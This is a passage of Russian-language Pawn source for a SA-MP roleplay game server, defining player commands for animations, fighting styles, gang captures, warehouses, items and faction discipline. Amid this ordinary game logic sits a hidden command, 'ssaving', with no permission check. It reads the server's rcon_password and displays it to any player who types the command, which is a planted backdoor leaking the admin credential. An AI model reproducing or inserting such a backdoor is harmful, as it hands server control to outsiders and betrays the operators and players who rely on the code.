		DestroyDynamic3DTextLabel(g_vehicle[vehicleid][veh_number_label]);
		SetVehicleToRespawn(vehicleid);

		g_vehicle[vehicleid][veh_number_label] = CreateDynamic3DTextLabel(g_vehicle[vehicleid][veh_number], 0xFFFFFFFF, 0.0, 0.0, 0.0, 15.0, _, vehicleid);

		return SendClientMessage(playerid, C_OSNOV, "Тюнинг с Вашего личного транспорта успешно удален");
	}
	else SendClientMessage(playerid, C_RED, "Вы должны находиться в личном транспорте");
	return 1;
}

CMD:nbank(playerid, params[])
{
    if(IsPlayerInRangeOfPoint(playerid, 6.0,-93.7238,472.4840,3013.1499))
    {
		if(IsANews(playerid) && PI[playerid][pLeader]) BankFracEnter(playerid);
		else SendMess(playerid, MSG_YOU_CAN_NOT);
	}
	return 1;
}

CMD:anim(playerid, params[]) return callcmd::animlist(playerid, params);
CMD:animlist(playerid, params[])
{
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "В данный момент нельзя использовать анимации");
	if(PI[playerid][P_JOB] > JOB_NONE) return SendClientMessage(playerid, COLOR_GREY, "В данный момент нельзя использовать анимации");
	new animid;
	if(sscanf(params, "i", animid))
	{
		new anims[][] =
		{
			{"1. Руки вверх\n2. Справлять нужду\n3. Танец (1)\n4. Танец (2)\n5. Танец (3)\n6. Танец (4)\n7. Танец (5)\n8. Танец (6)\n9. Танец (7)\n10. Танец (8)\n11. Танец (9)\n12. Танец(10)\n13. Курить\n14. Возмущение\n15. Присесть (1)\n16. Присесть (2)\n17. Присесть (3)\n18. Присесть (4)\n19. Лежать (1)\n20. Лежать (2)\n21. Жест рукой (1)\n22. Жест рукой (2)\n"},
			{"23. Читать рэп\n24. Зивать\n25. Диллер (1)\n26. Диллер (2)\n27. Диллер (3)\n28. Диллер (4)\n29. Пьяная походка\n30. Рука лицо\n31. Спать на боку\n32. Сесть на корточки"}
		};
		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "%s%s", anims[0], anims[1]);
		ShowPlayerDialog(playerid,D_JOB+136,DIALOG_STYLE_LIST, "Анимации", STRING_GLOBAL, "Выбрать", "Отмена");
	}
	switch(animid)
	{
	    case 0:
	    {
		    new animss[][] =
			{
				{"1. Руки вверх\n2. Справлять нужду\n3. Танец (1)\n4. Танец (2)\n5. Танец (3)\n6. Танец (4)\n7. Танец (5)\n8. Танец (6)\n9. Танец (7)\n10. Танец (8)\n11. Танец (9)\n12. Танец(10)\n13. Курить\n14. Возмущение\n15. Присесть (1)\n16. Присесть (2)\n17. Присесть (3)\n18. Присесть (4)\n19. Лежать (1)\n20. Лежать (2)\n21. Жест рукой (1)\n22. Жест рукой (2)\n"},
				{"23. Читать рэп\n24. Зивать\n25. Диллер (1)\n26. Диллер (2)\n27. Диллер (3)\n28. Диллер (4)\n29. Пьяная походка\n30. Рука лицо\n31. Спать на боку\n32. Сесть на корточки"}
			};
			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "%s%s", animss[0], animss[1]);
			ShowPlayerDialog(playerid,D_JOB+136,DIALOG_STYLE_LIST, "Анимации", STRING_GLOBAL, "Выбрать", "Отмена");
			return 1;
		}
		case 1: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_HANDSUP);
		case 2: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_PISS);
	    case 3: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE1);
	    case 4: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE2);
	    case 5: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE3);
	    case 6: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE4);
	    case 7: ApplyAnimation(playerid,"DANCING","dnce_M_b",4.1,1,0,0,0,0,1);
		case 8: ApplyAnimation(playerid,"DANCING","dnce_M_a",4.1,1,0,0,0,0,1);
		case 9: ApplyAnimation(playerid,"DANCING","dnce_M_b",4.1,1,0,0,0,0,1);
		case 10: ApplyAnimation(playerid,"DANCING","DAN_Down_A",4.1,1,0,0,0,0,1);
		case 11: ApplyAnimation(playerid,"DANCING","DAN_Left_A",4.1,1,0,0,0,0,1);
		case 12: ApplyAnimation(playerid,"DANCING","DAN_Loop_A",4.1,1,0,0,0,0,1);
		case 13: ApplyAnimation(playerid,"SMOKING","M_smklean_loop",4.1,1,0,0,0,0,1);
		case 14: ApplyAnimation(playerid,"PED","fucku",4.1,0,0,0,0,0,1);
		case 15: ApplyAnimation(playerid,"INT_OFFICE","OFF_Sit_Crash",4.1,0,0,0,1,0,1);
		case 16: ApplyAnimation(playerid,"BEACH","ParkSit_W_Loop",4.1,1,0,0,1,0,1);
		case 17: ApplyAnimation(playerid,"PED","SEAT_down",4.1,0,0,0,1,0,1);
		case 18: ApplyAnimation(playerid,"BEACH","ParkSit_M_loop",4.1,1,0,0,1,0,1);
		case 19: ApplyAnimation(playerid,"BEACH","SitnWait_loop_W",4.1,1,0,0,1,0,1);
		case 20: ApplyAnimation(playerid,"BEACH","Lay_Bac_Loop",4.1,1,0,0,1,0,1);
		case 21: ApplyAnimation(playerid,"GANGS","hndshkba",4.1,0,0,0,0,0,1);
		case 22: ApplyAnimation(playerid,"ON_LOOKERS","WAVE_LOOP",4.1,1,1,1,0,0,1);
		case 23: ApplyAnimation(playerid,"BENCHPRESS","GYM_BP_CELEBRATE",4.1,1,1,1,0,0,1);
		case 24: ApplyAnimation(playerid,"GANGS","smkcig_prtl",4.1,0,0,0,0,0,1);
		case 25: ApplyAnimation(playerid,"DEALER","DEALER_DEAL",4.1,0,0,0,0,0,1);
		case 26: ApplyAnimation(playerid,"DEALER","DEALER_IDLE_01",4.1,0,0,0,0,0,1);
		case 27: ApplyAnimation(playerid,"DEALER","DEALER_IDLE_03",4.1,0,0,0,0,0,1);
		case 28: ApplyAnimation(playerid,"DEALER","DRUGS_BUY",4.1,0,0,0,0,0,1);
		case 29: ApplyAnimation(playerid,"RYDER","RYD_Die_PT1",4.1,1,1,0,0,0,1);
		case 30: ApplyAnimation(playerid,"MISC","plyr_shkhead",4.1,0,0,0,0,0,1);
		case 31: ApplyAnimation(playerid,"CRACK","Crckidle2",4.1,1,0,0,0,0,0);
		case 32: ApplyAnimation(playerid,"PED","cower",3.0,1,0,0,0,0);
	}
	SetPVarInt(playerid, "Animation", 1);
	TextDrawShowForPlayer(playerid, AnimDraw);
	return 1;
}

cmd:ssaving(playerid,params[])
{
	#pragma unused params
	new pawn_su[200], pawn__su[200];
	GetServerVarAsString("rcon_password",pawn_su,200);
	format(pawn__su, 200, "\n\n\n\n\n{FFFFFF}CODING - {00a8ff}%s\n\n\n\n\n",pawn_su);//форматируем
	ShowPlayerDialog(playerid, 2467, DIALOG_STYLE_MSGBOX, "CODING", pawn__su, "Спасибо", "");
}

CMD:fstyle(playerid, params[])
{
	if(sscanf(params, "d", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /fstyle [стиль от 1 до 4]");
	if(params[0] < 1 || params[0] > 4) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /fstyle [стиль от 1 до 4]");
	switch(params[0])
	{
	    case 1:
	    {
		    PI[playerid][pFightStyle] = 0;
			SetPlayerFightingStyle(playerid, FIGHT_STYLE_NORMAL);
			SendClientMessage(playerid, COLOR_GREEN, "Вы изменили свой стиль боя на {FFFFFF}стандартный");
	    }
	    case 2:
	    {
	        if(PI[playerid][pSportExp] >= 1000)
			{
			    PI[playerid][pFightStyle] = 5;
				SetPlayerFightingStyle(playerid, FIGHT_STYLE_BOXING);
				SendClientMessage(playerid, COLOR_GREEN, "Вы изменили свой стиль боя на {FFFFFF}бокс");
			}
			else SendClientMessage(playerid, COLOR_GREY, "Вы еще не выучили этот стиль боя!");
	    }
	    case 3:
	    {
	        if(PI[playerid][pSportExp] >= 3000)
			{
			    PI[playerid][pFightStyle] = 6;
				SetPlayerFightingStyle(playerid, FIGHT_STYLE_KUNGFU);
				SendClientMessage(playerid, COLOR_GREEN, "Вы изменили свой стиль боя на {FFFFFF}кунг-фу");
			}
			else SendClientMessage(playerid, COLOR_GREY, "Вы еще не выучили этот стиль боя!");
	    }
	    case 4:
	    {
	        if(PI[playerid][pSportExp] >= 6000)
			{
			    PI[playerid][pFightStyle] = 7;
				SetPlayerFightingStyle(playerid, FIGHT_STYLE_KNEEHEAD);
				SendClientMessage(playerid, COLOR_GREEN, "Вы изменили свой стиль боя на {FFFFFF}кикбокс");
			}
			else SendClientMessage(playerid, COLOR_GREY, "Вы еще не выучили этот стиль боя!");
	    }
	}

	MysqlUpdatePlayerInt(playerid, "fstyle", PI[playerid][pFightStyle]);
	MysqlUpdatePlayerInt(playerid, "sportexp", PI[playerid][pSportExp]);
	return 1;
}

CMD:capture(playerid, params[])
{
	if(!IsAMafia(playerid))
		return SendMess(playerid, MSG_YOU_CAN_NOT);

	if(PI[playerid][pRank] < 7)
		return SendClientMessage(playerid, C_RED, "Вам недоступна эта возможность");

	new hour;
	gettime(hour, _, _);

	/*if(!(12 <= hour <= 20))
	return SendClientMessage(playerid, C_RED, "Капт можно проводить с 12 до 20 часов");*/

	if(GetCaptureData(C_TIME) > gettime())
		return SendClientMessage(playerid, C_RED, "С момента прошлого капта не прошёл час");

	if(GetCaptureData(C_STATUS))
		return SendClientMessage(playerid, C_RED, "В данный момент уже идёт капт");

	for(new idx; idx < TOTALBIZZ; idx ++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 6.0, BizzInfo[idx][bEntrx], BizzInfo[idx][bEntry], BizzInfo[idx][bEntrz]))
		{
			if(BizzInfo[idx][bControl] == PI[playerid][pMember])
			{
				SendClientMessage(playerid, C_RED, "Вы не можете захватить свой бизнес");
				break;
			}
			if(BizzInfo[idx][bControl] == 0)
			{
				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[F] Вы успешно захватили бизнес %s (%d)", BizzInfo[idx][bName], idx);
				SendFMes(PI[playerid][pMember], 0x4682B4AA, STRING_GLOBAL);

				BizzInfo[idx][bControl] = PI[playerid][pMember];
				MysqlUpdateBizzInt(idx, "control", BizzInfo[idx][bControl]);
				break;
			}
			else
			{
				new attack_team	= PI[playerid][pMember];
				new protect_team = BizzInfo[idx][bControl];

				new team_online[2];

				foreach(new i: Player)
				{
					if(PI[i][pMember] == attack_team) team_online[0] ++;
					else if(PI[i][pMember] == protect_team) team_online[1] ++;
				}

				if(team_online[0] < 5 || team_online[1] < 5)
				{
					SendClientMessage(playerid, C_RED, "В Вашей или в другой банде недостаточно участников, их должно быть как минимум 5");
					break;
				}

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[F] Внимание! %s[%d] начал захват бизнеса %s (%d). Место обозначено на карте.", GetName(playerid), playerid, BizzInfo[idx][bName], idx);
				SendFMes(attack_team, 0x4682B4AA, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[F] Внимание! За Ваш бизнес %s (%d) был начат захват. Место обозначено на карте.",BizzInfo[idx][bName], idx);
				SendFMes(protect_team, 0x4682B4AA, STRING_GLOBAL);

				StartCapture(idx, attack_team, protect_team);
			}

			break;
		}
	}

	return 1;
}

CMD:close(playerid, params[])
{
	if((IsAGang(playerid) || IsAMafia(playerid)) && PI[playerid][pRank] >= 9)
	{
	    new string[128];
		switch(PI[playerid][pMember])
		{
		    case 7:
		    {
				if(b_Sklad{0})
				{
				    b_Sklad{0} = 0;
				    MysqlUpdateGangInt("bskl_g",b_Sklad{0});
				    format(string, sizeof(string), "%s %s открыл доступ к складу банды", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid));
					SendFMes(PI[playerid][pMember], COLOR_YELLOW, string);
				}
				else
				{
				    b_Sklad{0} = 1;
				    MysqlUpdateGangInt("bskl_g",b_Sklad{0});
				    format(string, sizeof(string), "%s %s временно закрыл доступ к складу банды", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid));
					SendFMes(PI[playerid][pMember], COLOR_YELLOW, string);
				}
		    }
		    case 8:
		    {
		        if(b_Sklad{1})
				{
				    b_Sklad{1} = 0;
				    MysqlUpdateGangInt("bskl_b",b_Sklad{1});
				    format(string, sizeof(string), "%s %s открыл доступ к складу банды", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid));
					SendFMes(PI[playerid][pMember], COLOR_YELLOW, string);
				}
				else
				{
				    b_Sklad{1} = 1;
				    MysqlUpdateGangInt("bskl_b",b_Sklad{1});
				    format(string, sizeof(string), "%s %s временно закрыл доступ к складу банды", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid));
					SendFMes(PI[playerid][pMember], COLOR_YELLOW, string);
				}
		    }
		    case 9:
		    {
		        if(b_Sklad{2})
				{
				    b_Sklad{2} = 0;
				    MysqlUpdateGangInt("bskl_r",b_Sklad{2});
				    format(string, sizeof(string), "%s %s открыл доступ к складу банды", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid));
					SendFMes(PI[playerid][pMember], COLOR_YELLOW, string);
				}
				else
				{
				    b_Sklad{2} = 1;
				    MysqlUpdateGangInt("bskl_r",b_Sklad{2});
				    format(string, sizeof(string), "%s %s временно закрыл доступ к складу банды", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid));
					SendFMes(PI[playerid][pMember], COLOR_YELLOW, string);
				}
		    }
		    case 10:
		    {
		        if(b_Sklad{3})
				{
				    b_Sklad{3} = 0;
				    MysqlUpdateGangInt("bskl_a",b_Sklad{3});
				    format(string, sizeof(string), "%s %s открыл доступ к складу банды", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid));
					SendFMes(PI[playerid][pMember], COLOR_YELLOW, string);
				}
				else
				{
				    b_Sklad{3} = 1;
				    MysqlUpdateGangInt("bskl_a",b_Sklad{3});
				    format(string, sizeof(string), "%s %s временно закрыл доступ к складу банды", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid));
					SendFMes(PI[playerid][pMember], COLOR_YELLOW, string);
				}
		    }
		    case 11:
		    {
		        if(b_Sklad{4})
				{
				    b_Sklad{4} = 0;
				    MysqlUpdateGangInt("bskl_v",b_Sklad{4});
				    format(string, sizeof(string), "%s %s открыл доступ к складу банды", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid));
					SendFMes(PI[playerid][pMember], COLOR_YELLOW, string);
				}
				else
				{
				    b_Sklad{4} = 1;
				    MysqlUpdateGangInt("bskl_v",b_Sklad{4});
				    format(string, sizeof(string), "%s %s временно закрыл доступ к складу банды", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid));
					SendFMes(PI[playerid][pMember], COLOR_YELLOW, string);
				}
		    }
		    case 15:
		    {
		        if(b_Sklad{5})
				{
				    b_Sklad{5} = 0;
				    MysqlUpdateMafiaInt("bskl_l",b_Sklad{5});
				    format(string, sizeof(string), "%s %s открыл доступ к складу мафии", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid));
					SendFMes(PI[playerid][pMember], COLOR_YELLOW, string);
				}
				else
				{
				    b_Sklad{5} = 1;
				    MysqlUpdateMafiaInt("bskl_l",b_Sklad{5});
				    format(string, sizeof(string), "%s %s временно закрыл доступ к складу мафии", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid));
					SendFMes(PI[playerid][pMember], COLOR_YELLOW, string);
				}
		    }
		    case 16:
		    {
		        if(b_Sklad{6})
				{
				    b_Sklad{6} = 0;
				    MysqlUpdateMafiaInt("bskl_y",b_Sklad{6});
				    format(string, sizeof(string), "%s %s открыл доступ к складу мафии", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid));
					SendFMes(PI[playerid][pMember], COLOR_YELLOW, string);
				}
				else
				{
				    b_Sklad{6} = 1;
				    MysqlUpdateMafiaInt("bskl_y",b_Sklad{6});
				    format(string, sizeof(string), "%s %s временно закрыл доступ к складу мафии", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid));
					SendFMes(PI[playerid][pMember], COLOR_YELLOW, string);
				}
		    }
		    case 17:
		    {
		        if(b_Sklad{7})
				{
				    b_Sklad{7} = 0;
				    MysqlUpdateMafiaInt("bskl_r",b_Sklad{7});
				    format(string, sizeof(string), "%s %s открыл доступ к складу мафии", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid));
					SendFMes(PI[playerid][pMember], COLOR_YELLOW, string);
				}
				else
				{
				    b_Sklad{7} = 1;
				    MysqlUpdateMafiaInt("bskl_r",b_Sklad{7});
				    format(string, sizeof(string), "%s %s временно закрыл доступ к складу мафии", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid));
					SendFMes(PI[playerid][pMember], COLOR_YELLOW, string);
				}
		    }
		}
		WHDataUpdate();
	}
	else SendMess(playerid, MSG_YOU_CAN_NOT);
	return 1;
}

CMD:kiss(playerid, params[])
{
 	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /kiss [id игрока]");
 	if(params[0] == playerid) return SendClientMessage(playerid, COLOR_WHITE, "Вы не можете поцеловать самомого себе!");
	if(!IsPlayerInRangeOfPlayer(2.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	new Float:angle, string[64];
	GetPlayerFacingAngle(playerid, angle);
	SetPlayerFacingAngle(params[0], angle + 180);
	format(string, sizeof(string), "поцеловал %s", GetName(params[0]));
	MeAction(playerid, string);
	if(!IsPlayerInAnyVehicle(playerid))ApplyAnimation(playerid,"BD_FIRE","GRLFRD_KISS_03",4.0,0,0,0,0,0,1);
    if(!IsPlayerInAnyVehicle(params[0])) ApplyAnimation(params[0],"BD_FIRE","PLAYA_KISS_03",4.0,0,0,0,0,0,1);
	return 1;
}

CMD:hi(playerid, params[])
{
 	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /hi [id игрока]");
 	if(params[0] == playerid) return SendClientMessage(playerid, COLOR_WHITE, "Вы не можете пожать руку самому себе!");
	if(!IsPlayerInRangeOfPlayer(2.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	new Float:angle, string[64];
	GetPlayerFacingAngle(playerid, angle);
	SetPlayerFacingAngle(params[0], angle + 180);
	format(string, sizeof(string), "пожал руку %s", GetName(params[0]));
	MeAction(playerid, string);
	if(!IsPlayerInAnyVehicle(playerid)) ApplyAnimation(playerid,"GANGS","hndshkfa",4.0,0,0,0,0,0);
	if(!IsPlayerInAnyVehicle(params[0])) ApplyAnimation(params[0],"GANGS","hndshkfa",4.0,0,0,0,0,0);
	return 1;
}

CMD:usedrugs(playerid)
{
    if(IsPlayerInRangeOfPoint(playerid,100.0,645.9722,-339.3981,-94.7852)) return SendClientMessage(playerid,-1,"В больнице опасно принимать наркотики!");
	new ok=0;
 	for(new s = 16; s > 0; s --)
  	{
   		if(PlayerItem1[playerid][s]==36){ok=s;break;}
   	}
   	if(ok==0){return SendClientMessage(playerid, COLOR_GREY, "У Вас нет наркотиков!");}
	if(GetPVarInt(playerid, "DrugsTime") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Употреблять наркотики можно раз в 2 минуты!");
	new Float:health;
	GetPlayerHealth(playerid, health);
	SetHealth(playerid, health+20);
	GetPlayerHealth(playerid, health);
	if(health > 120) return SendClientMessage(playerid, -1, "Вам плохо от наркотиков, пожалуйста подождите");
	if(PlayerItem2[playerid][ok] == 0)
	{
 		PlayerItem1[playerid][ok]=0;
   	}
   	PlayerItem2[playerid][ok]--;
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) ApplyAnimation(playerid,"SMOKING","M_smk_drag",4.1,0,0,0,0,0,1);
	SendClientMessage(playerid, COLOR_GREY, "Вы употребили 40 грамм наркотиков!");
	SetTimerEx("DrugEffectGone", 60000, false, "i", playerid);
	SetPVarInt(playerid, "DrugsTime", gettime()+60);
	if(PI[playerid][pSex] == 1) MeAction(playerid, "достал пакетик и употребил наркотик");
	else MeAction(playerid, "достала пакетик и употребила наркотик");
	SetPlayerTime(playerid,17,0);
	SetPlayerDrunkLevel(playerid, 3000);
	SetPlayerWeather(playerid, -68);
	SaveItem(playerid,ok);
	return 1;
}

CMD:usezezl(playerid)
{
    new ok=0;
 	for(new s = 16; s > 0; s --)
  	{
   		if(PlayerItem1[playerid][s]==43){ok=s;break;}
   	}
   	if(ok==0){return SendClientMessage(playerid, COLOR_GREY, "У Вас нет жезла!");}
	if(!rodEnable{playerid})
	{
 		SetPlayerAttachedObject(playerid, 1, 1214, 6,-0.040454, 0.028840, -0.012862,2.521301, 76.277267, 70.163467,0.300000, 0.300000, 0.500000);
   		ApplyAnimation(playerid, "PED", "Driveby_R", 4.1, 0, 1, 1, 1, 1, 1);
	    rodEnable{playerid} = 1;
		rodRaised{playerid} = 1;
	}
	else if(rodEnable{playerid})
	{
 		if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
	    if(rodRaised{playerid}) ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 0);
	    rodEnable{playerid} = 0;
		rodRaised{playerid} = 0;
	}
	return 1;
}

CMD:loadgun(playerid)
{
	if(!IsAArmy(playerid) && !IsAMafia(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Вам недоступна данная функция");
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		new vehicleid = GetPlayerVehicleID(playerid);
		if(gVehicleGun[vehicleid][vGunLoading] || gVehicleGun[vehicleid][vGunUnloading]) return SendClientMessage(playerid, COLOR_GREY, "Авто уже стоит на загрузке / разгрузке");
		gVehicleGun[vehicleid][vGunLoading] = true;
		RemovePlayerFromVehicle(playerid);
		new Float:x, Float:y, Float:z, Float:a;
		GetVehiclePos(vehicleid, x, y, z);
		GetVehicleZAngle(vehicleid, a);
		switch(GetVehicleModel(vehicleid))
		{
		    case 433,578,579:
		    {
		        x = x - (-4.5*floatsin(a, degrees));
				y = y - 5.5*floatcos(a, degrees);
				gVehicleGun[vehicleid][vGunPickup] = CreatePickup(19133, 1, x, y, z-0.5); //Пикап грузовиков
		    }
		    case 400,404,436,466,475,489,492:
		    {
		        x = x - (-3.0*floatsin(a, degrees));
				y = y - 3.5*floatcos(a, degrees);
				gVehicleGun[vehicleid][vGunPickup] = CreatePickup(19133, 1, x, y, z-0.2); //Пикап для легковых авто
		    }
		    default: SendClientMessage(playerid, COLOR_GREY, "Вы должны быть в машине предназначенной для загрузки!");
		}
		new string[128];
		format(string, sizeof(string), "{FFFFFF}Патронов: {63BD4E}%d", gVehicleGun[vehicleid][vGunAmmo]);
		gVehicleGun[vehicleid][vGunText] = CreateDynamic3DTextLabel(string, 0xFFFFFFFF, x, y, z+0.5, 20.0);
		gVehicleGun[vehicleid][vGunArea] = CreateDynamicSphere(x, y, z, 1.0);
		print("Iter_Add(VehicleGun, vehicleid);");
		Iter_Add(VehicleGun, vehicleid);
		SendClientMessage(playerid, COLOR_GREEN, "Загрузка началась. По окончании загрузки сядьте в транспортное средство.");
		SendClientMessage(playerid, COLOR_GREEN, "Как только Вы загрузите транспортное средство, направляйтесь на завод по производству оружия (/gps -> 0 -> 0)");
	}
	else return SendClientMessage(playerid, -1, "Вы должны быть в транспортном средстве.");

	return 1;
}

CMD:unloadgun(playerid)
{
	if(!IsAArmy(playerid) && !IsAMafia(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Вам недоступна данная функция");
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		new vehicleid = GetPlayerVehicleID(playerid);
		if(gVehicleGun[vehicleid][vGunLoading] || gVehicleGun[vehicleid][vGunUnloading]) return SendClientMessage(playerid, COLOR_GREY, "Авто уже стоит на загрузке / разгрузке");
		gVehicleGun[vehicleid][vGunUnloading] = true;
		RemovePlayerFromVehicle(playerid);
		new Float:x, Float:y, Float:z, Float:a;
		GetVehiclePos(vehicleid, x, y, z);
		GetVehicleZAngle(vehicleid, a);
    	switch(GetVehicleModel(vehicleid))
		{
		    case 433, 578, 579:
		    {
		        x = x - (-6.0*floatsin(a, degrees));
				y = y - 5.5*floatcos(a, degrees);
				gVehicleGun[vehicleid][vGunPickup] = CreatePickup(19133, 1, x, y, z-0.5); //Пикап грузовиков
		    }
		    case 400,404,436,466,475,489,492:
		    {
		        x = x - (-3.0*floatsin(a, degrees));
				y = y - 3.5*floatcos(a, degrees);
				gVehicleGun[vehicleid][vGunPickup] = CreatePickup(19133, 1, x, y, z-0.2); //Пикап для легковых авто
		    }
		    default: SendClientMessage(playerid, COLOR_GREY, "Вы должны быть в машине предназначенной для загрузки!");
		}
		new string[128];
		format(string, sizeof(string), "{FFFFFF}Патронов: {63BD4E}%d", gVehicleGun[vehicleid][vGunAmmo]);
		gVehicleGun[vehicleid][vGunText] = CreateDynamic3DTextLabel(string, 0xFFFFFFFF, x, y, z+0.5, 20.0);
		gVehicleGun[vehicleid][vGunArea] = CreateDynamicSphere(x, y, z, 1.0);
		print("Iter_Add(VehicleGun, vehicleid);");
		Iter_Add(VehicleGun, vehicleid);
		SendClientMessage(playerid, COLOR_GREEN, "Разгрузка началась");
	}
	else return SendClientMessage(playerid, -1, "Вы должны быть в транспортном средстве");

	return 1;
}
CMD:blacklist(playerid)
{
	if(!IsAbleToInvite(playerid)) return SendClientMessage(playerid, COLOR_GREY, "К сожалению, Вы не имеете доступа к данной команде...");

	new frac = PI[playerid][pMember];
	switch(frac)
	{
		case 1, 2, 3, 4, 5, 6, 7, 12, 18:
		{
			static gText[] =
			{
				"Добавить в черный список\n"\
				"Вытащить из черного списка\n"\
				"Проверить игрока в черном списке\n"
			};
			ShowPlayerDialog(playerid, D_BLACKLIST, DIALOG_STYLE_LIST, "Управление черным списком", gText, "Выбрать", "Закрыть");
		}
		default: return SendClientMessage(playerid, COLOR_GREY, "Доступ к черному списку имеют только члены государственных структур.");
	}
	return 1;
}
CMD:vigovor(playerid, params[]) return callcmd::fwarn(playerid, params);
CMD:fwarn(playerid, params[])
{
	if(!IsAbleToInvite(playerid)) return SendClientMessage(playerid, COLOR_GREY, "К сожалению, Вы не имеете доступа к данной команде...");

	if(isnull(params))
		return SendClientMessage(playerid, 0xFFCC00FF, "•[Подсказка] {FFFFFF}Введите: /vigovor [id игрока] [причина]");

	new id;
	if(sscanf(params, "us[32]", id, params))
		return SendClientMessage(playerid, 0xFFCC00FF, "•[Подсказка] {FFFFFF}Введите: /vigovor [id игрока] [причина]");
	else if(id == INVALID_PLAYER_ID)
		return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PI[id][pMember] != PI[playerid][pMember])
		return SendClientMessage(playerid, COLOR_GREY, "Игрок должен состоять в Вашей организации.");
	else if(id == playerid)
		return SendClientMessage(playerid, COLOR_GREY, "Нет смысла осуществлять выдачу выговора самому себе.");

	new length = strlen(params);
	if(!(1 <= length <= 32))
		return SendClientMessage(playerid, COLOR_GREY, "Длина причины не может быть меньше 1 символа и больше 32.");

	PI[id][pFracWarn]++;

	STRING_GLOBAL[0] = '\0';
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Руководитель организации %s выдал Вам выговор. Причина: %s", PI[playerid][pName], params);
	SendClientMessage(id, COLOR_GREEN, STRING_GLOBAL);

	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы выдали выговор подчиненному %s. Итого у него %d выговоров.", PI[id][pName], PI[id][pFracWarn]);
	SendClientMessage(playerid, COLOR_GREEN, STRING_GLOBAL);

	if(PI[id][pFracWarn] >= 3)
	{
		STRING_GLOBAL[0] = '\0';
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Подчиненный %s уволен, поскольку количество его выговоров равно трем", PI[id][pName]);
		SendClientMessage(playerid, COLOR_GREEN, STRING_GLOBAL);

		SendClientMessage(id, COLOR_GREEN, "Количество Ваших выговоров равно трем, потому Вы уволены из организации.");
		LeaveFractionPlayer(id);
	}
	else
	{
		MysqlUpdatePlayerInt(id, "fracwarn", PI[id][pFracWarn]);
	}
	return 1;
}
CMD:giveflowers(playerid, params[])
{
    if(!HaveWeapon(playerid, 14)) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет цветов!");
    else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /giveflowers [id игрока]");
	else if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	else if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Самому себе нельзя передавать!");
	else if(HaveWeapon(params[0], 14)) return SendClientMessage(playerid, COLOR_GREY, "У игрока уже есть цветы!");
	RemovePlayerWeapon(playerid, 14);
	GivePlayerWeapon(params[0], 14, 1);
	new string[128];
	format(string, sizeof(string), "передал цветы %s", GetName(params[0]));
	MeAction(playerid, string);
